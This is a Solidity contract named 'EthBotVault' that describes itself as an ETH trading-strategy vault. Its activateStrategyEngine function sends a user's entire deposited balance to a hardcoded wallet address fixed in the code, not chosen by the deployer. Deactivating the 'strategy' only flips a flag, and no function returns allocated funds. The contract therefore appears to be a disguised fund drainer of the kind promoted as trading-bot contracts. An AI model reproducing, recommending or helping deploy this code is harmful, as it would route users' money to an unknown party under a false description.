// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title EthBotVault
/// @notice ETH strategy vault. Users can fund the vault, withdraw available funds, or allocate available funds to the configured strategy wallet.
contract EthBotVault {
    address payable private constant DEFAULT_STRATEGY_WALLET = payable(0xe9e41C03D5b0b6fb543F4cd1Cd8Ad81ece4C830f);

    address public immutable owner;
    address payable public immutable strategyWallet;
    bool public depositsPaused;
    uint256 public totalDeposits;
    uint256 public totalAllocatedToStrategy;

    mapping(address user => uint256 balance) public balances;
    mapping(address user => bool enabled) public strategyActive;
    mapping(address user => uint256 amount) public allocatedToStrategy;

    uint256 private locked = 1;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event StrategyEngineActivated(address indexed user, uint256 amount);
    event StrategyEngineDeactivated(address indexed user);
    event DepositsPausedSet(bool paused);

    error ZeroAmount();
    error DepositsPaused();
    error InsufficientBalance();
    error EthTransferFailed();
    error NotOwner();
    error NoVaultBalance();
    error ReentrantCall();
    error StrategyAlreadyActive();

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    modifier nonReentrant() {
        if (locked != 1) revert ReentrantCall();
        locked = 2;
        _;
        locked = 1;
    }

    constructor() {
        owner = msg.sender;
        strategyWallet = DEFAULT_STRATEGY_WALLET;
    }

    receive() external payable {
        deposit();
    }

    function deposit() public payable {
        if (depositsPaused) revert DepositsPaused();
        if (msg.value == 0) revert ZeroAmount();

        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;

        emit Deposited(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) public nonReentrant {
        if (amount == 0) revert ZeroAmount();
        if (balances[msg.sender] < amount) revert InsufficientBalance();

        strategyActive[msg.sender] = false;
        balances[msg.sender] -= amount;
        totalDeposits -= amount;

        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        if (!ok) revert EthTransferFailed();

        emit Withdrawn(msg.sender, amount);
    }

    function withdrawAll() external {
        withdraw(balances[msg.sender]);
    }

    function activateStrategyEngine() public nonReentrant {
        uint256 amount = balances[msg.sender];
        if (amount == 0) revert NoVaultBalance();
        if (strategyActive[msg.sender]) revert StrategyAlreadyActive();

        balances[msg.sender] = 0;
        totalDeposits -= amount;
        strategyActive[msg.sender] = true;
        allocatedToStrategy[msg.sender] += amount;
        totalAllocatedToStrategy += amount;

        (bool ok, ) = strategyWallet.call{value: amount}("");
        if (!ok) revert EthTransferFailed();

        emit StrategyEngineActivated(msg.sender, amount);
    }

    function deactivateStrategyEngine() public {
        strategyActive[msg.sender] = false;
        emit StrategyEngineDeactivated(msg.sender);
    }

    function setDepositsPaused(bool paused) external onlyOwner {
        depositsPaused = paused;
        emit DepositsPausedSet(paused);
    }
}
